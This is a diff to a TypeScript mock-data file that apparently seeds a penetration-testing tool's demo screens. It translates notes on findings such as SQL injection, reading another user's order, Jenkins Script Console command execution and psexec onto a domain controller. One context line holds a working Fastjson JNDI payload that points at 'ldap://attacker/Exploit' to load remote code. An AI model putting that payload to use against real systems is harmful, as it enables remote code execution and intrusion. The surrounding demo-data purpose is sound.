@@ -75,20 +75,20 @@ interface MockBindingSeed {
 // Pre-set traffic evidence per finding (finding id → bound captures), chosen to match each finding's semantics
 // so the 'linked traffic' section of the demo detail page looks realistic.
 const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
-  "f-1": [{ traffic_id: "x-2", role: "proof", note: "q 参数注入 payload，响应回显 MSSQL 报错。" }],
+  "f-1": [{ traffic_id: "x-2", role: "proof", note: "Payload injected via the q parameter; the response echoes an MSSQL error." }],
   "f-2": [
-    { traffic_id: "x-8", role: "baseline", note: "本人订单 id=1001，作为正常对照。" },
-    { traffic_id: "x-9", role: "proof", note: "改 id=1002 越权读到他人订单。" },
+    { traffic_id: "x-8", role: "baseline", note: "Own order id=1001, used as the normal baseline." },
+    { traffic_id: "x-9", role: "proof", note: "Changing id to 1002 reads an order that belongs to another user (broken authorization)." },
   ],
   "f-12": [
-    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload，触发回连。" },
-    { traffic_id: "x-16", role: "verification", note: "二次请求确认命令执行落地。" },
+    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload triggers a callback." },
+    { traffic_id: "x-16", role: "verification", note: "Second request confirms the command execution." },
   ],
   "f-15": [
-    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console 未授权可达。" },
-    { traffic_id: "x-18", role: "proof", note: "scriptText 执行 Groovy 命令返回 SYSTEM。" },
+    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console is reachable without authentication." },
+    { traffic_id: "x-18", role: "proof", note: "scriptText runs a Groovy command and returns SYSTEM." },
   ],
-  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec 以 svc_deploy 登录域控 DC01。" }],
+  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec logs in to domain controller DC01 as svc_deploy." }],
 };
 
 // Fixed message bodies for the demo so the detail page's Request/Response is not blank.
@@ -100,7 +100,7 @@ const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
   "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
   "x-9": {
     req: "",
-    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"北京市朝阳区 ****","phone":"138****6021"}',
+    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"Chaoyang District, Beijing ****","phone":"138****6021"}',
   },
   "x-15": {
     req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
@@ -1776,11 +1776,11 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     let mappings: Array<{ intentID: string; assetID: number; summary: string }> = [];
     if (seg[1] === "t-acme-web") {
       mappings = [
-        { intentID: "i3", assetID: 6, summary: "后台功能枚举意图从前序子域发现中选定" },
-        { intentID: "i5", assetID: 3, summary: "订单接口测试意图从 API 任务目标中选定" },
+        { intentID: "i3", assetID: 6, summary: "Admin feature enumeration intent selected from earlier subdomain discovery" },
+        { intentID: "i5", assetID: 3, summary: "Order API testing intent selected from the API task goal" },
       ];
     } else if (seg[1] === "t-acme-api") {
-      mappings = [{ intentID: "i5", assetID: 3, summary: "订单接口测试意图从 API 任务目标中选定" }];
+      mappings = [{ intentID: "i5", assetID: 3, summary: "Order API testing intent selected from the API task goal" }];
     }
     const sourceTaskID = mockTaskAssetID(seg[1]) ?? 0;
     const assets: IntentAsset[] = mappings.flatMap((mapping) => {
